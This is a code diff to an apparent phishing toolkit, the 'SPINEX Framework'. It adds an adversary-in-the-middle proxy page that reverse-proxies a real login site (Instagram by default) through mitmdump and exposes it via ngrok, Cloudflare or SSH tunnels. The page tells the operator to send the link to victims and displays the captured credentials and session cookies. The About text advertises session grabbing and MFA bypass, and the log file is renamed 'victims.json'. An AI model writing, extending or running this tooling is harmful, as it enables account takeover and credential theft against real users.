@@ -33,7 +33,7 @@ st.markdown("""
     </style>
     """, unsafe_allow_html=True)
 
-LOG_FILE = "victims.json"
+LOG_FILE = "creds\\victims.json"
 PHISH_TEMPLATE = "assets\\phish_temp"
 TEMPLATE_DIR = "assets\\mail_templates"
 
@@ -67,6 +67,22 @@ def kill_all_sessions():
                 os.kill(st.session_state['server_pid'], signal.SIGTERM)
         except Exception as e:
             st.warning(f"Could not kill server process: {e}")
+        st.session_state['server_pid'] = None
+        st.session_state['server_live'] = False
+    if 'mitm_proc' in st.session_state and st.session_state['mitm_proc']:
+        try:
+            proc = st.session_state['mitm_proc']
+            proc.terminate()
+            proc.wait(timeout=5)
+        except Exception as e:
+            st.warning(f"Could not kill mitmproxy gracefully: {e}")
+            if os.name == 'nt':
+                os.system(f"taskkill /F /PID {st.session_state['mitm_pid']} /T")
+            else:
+                os.kill(st.session_state['mitm_pid'], signal.SIGKILL)
+        st.session_state['mitm_proc'] = None
+        st.session_state['mitm_pid'] = None
+        st.session_state['mitm_live'] = False
     try:
         ngrok.kill()
     except:
@@ -81,11 +97,9 @@ def kill_all_sessions():
         except:
             pass
         st.session_state['cf_proc'] = None
-    st.session_state['server_pid'] = None
-    st.session_state['server_live'] = False
     st.session_state['active_tunnel'] = "None"
     st.session_state['public_url'] = ""
-    
+
     st.success("All sessions terminated successfully.")
 
 def start_local_server(port, directory):
@@ -366,6 +380,134 @@ def phish_temp():
                 st.success("Phish session terminated. Dashboard remains live.")
                 st.rerun()
 
+def start_mitmproxy(port, target_domain):
+    """Launch mitmproxy with custom addon on specified port."""
+    try:
+        addon_path = os.path.abspath("aitm_addon.py")
+        if not os.path.exists(addon_path):
+            st.error(f"Addon file not found: {addon_path}")
+            return False
+        
+        cmd = [
+            "mitmdump",
+            "-q",
+            "--set", f"addon={addon_path}",
+            "--mode", f"reverse:{target_domain}",
+            "--listen-port", str(port)
+        ]
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
+        )
+
+        time.sleep(2)
+
+        if proc.poll() is not None:
+            stdout, stderr = proc.communicate()
+            error_msg = stderr or stdout or "Unknown error"
+            st.error(f"mitmproxy failed to start:\n{error_msg}")
+            return False
+
+        st.session_state['mitm_pid'] = proc.pid
+        st.session_state['mitm_proc'] = proc
+        st.session_state['mitm_live'] = True
+        return True
+
+    except Exception as e:
+        st.error(f"Exception while starting mitmproxy: {e}")
+        return False
+
+def stop_mitmproxy():
+    if 'mitm_proc' in st.session_state and st.session_state['mitm_proc']:
+        proc = st.session_state['mitm_proc']
+        try:
+            proc.terminate()
+            proc.wait(timeout=5)
+        except:
+            if os.name == 'nt':
+                os.system(f"taskkill /F /PID {proc.pid} /T")
+            else:
+                os.kill(proc.pid, signal.SIGKILL)
+        st.session_state['mitm_proc'] = None
+        st.session_state['mitm_pid'] = None
+        st.session_state['mitm_live'] = False
+        st.success("mitmproxy stopped.")
+
+def aitm_proxy():
+    st.title("👁️ Adversary-in-the-Middle Proxy")
+
+    if 'mitm_live' not in st.session_state:
+        st.session_state['mitm_live'] = False
+    if 'mitm_port' not in st.session_state:
+        st.session_state['mitm_port'] = 8081
+
+    col1, col2 = st.columns(2)
+
+    with col1:
+        st.subheader("⚙️ Proxy Configuration")
+        target_domain = st.text_input(
+            "Target Domain (with protocol)",
+            value="https://www.instagram.com",
+            help="The real login page you want to proxy"
+        )
+        port = st.number_input("Local Port", value=st.session_state['mitm_port'], key="mitm_port_input")
+        st.session_state['mitm_port'] = port
+
+        if not st.session_state['mitm_live']:
+            if st.button("🚀 Start AiTM Proxy"):
+                if start_mitmproxy(port, target_domain):
+                    st.success(f"mitmproxy started on port {port}")
+                    st.rerun()
+        else:
+            st.info(f"✅ Proxy running on port {st.session_state['mitm_port']}")
+            if st.button("🛑 Stop AiTM Proxy"):
+                stop_mitmproxy()
+                st.rerun()
+
+    with col2:
+        st.subheader("🌍 Public Exposure")
+        tunnel_provider = st.selectbox("Tunnel Provider", ["Ngrok", "Cloudflare", "SSH"])
+        if st.button("Expose Proxy via Tunnel"):
+            p = st.session_state['mitm_port']
+            if tunnel_provider == "Ngrok":
+                start_ngrok(p)
+            elif tunnel_provider == "Cloudflare":
+                start_cloudflare(p)
+            else:
+                start_ssh_tunnel(p)
+        if st.session_state['public_url']:
+            st.success(f"Public URL: {st.session_state['public_url']}")
+            st.caption("Send this link to victims. (Kill session in 'Phish Template' > 'Live Deployment Status')")
+    st.divider()
+    st.subheader("📡 Captured Credentials")
+    if os.path.exists("aitm_credentials.json"):
+        with open("aitm_credentials.json", "r") as f:
+            lines = f.readlines()
+        if lines:
+            for line in lines[-5:]:
+                entry = json.loads(line)
+                st.json(entry)
+        else:
+            st.info("No credentials captured yet.")
+    else:
+        st.info("No credentials captured yet.")
+
+    st.subheader("🍪 Captured Cookies")
+    if os.path.exists("aitm_cookies.json"):
+        with open("aitm_cookies.json", "r") as f:
+            lines = f.readlines()
+        if lines:
+            for line in lines[-5:]:
+                entry = json.loads(line)
+                st.json(entry)
+        else:
+            st.info("No cookies captured yet.")
+    else:
+        st.info("No cookies captured yet.")
+
 def about():
     st.title("🕸️ About SPINEX Framework")
     col1, col2 = st.columns([1, 2])
@@ -395,6 +537,7 @@ def about():
         * **Dynamic Email Spoofing:** In-built SMTP integration with HTML template injection for realistic lure delivery.
         * **Live Exfiltration Dashboard:** Real-time data capture including credentials, IP addresses, and device fingerprints (User-Agent analysis).
         * **Device Spoofing Profiles:** Pre-configured device metadata to increase the authenticity of "New Login" alerts.
+        * **AiTM Proxy: Adversary-in-the-Middle Proxy for Session grabbing and MFA bypass**
         """)
 
     st.divider()
@@ -406,7 +549,7 @@ def about():
         st.caption("Streamlit (Python-based Web Framework)")
     with t2:
         st.write("**Backend Logic**")
-        st.caption("Python 3.x, SMTP/MIME, JSON persistence")
+        st.caption("Python 3.x, SMTP/MIME, JSON persistence, Mitmproxy")
 
     st.divider()
 
@@ -440,6 +583,7 @@ pg = st.navigation({
     "Operations": [
         st.Page(craft_mail, title="Email Spoofer", icon="📨"),
         st.Page(phish_temp, title="Phish Template", icon="🎣"),
+        st.Page(aitm_proxy, title="AiTM Proxy", icon="👁️"),
         st.Page(about, title="About", icon="❔")
     ],
 })
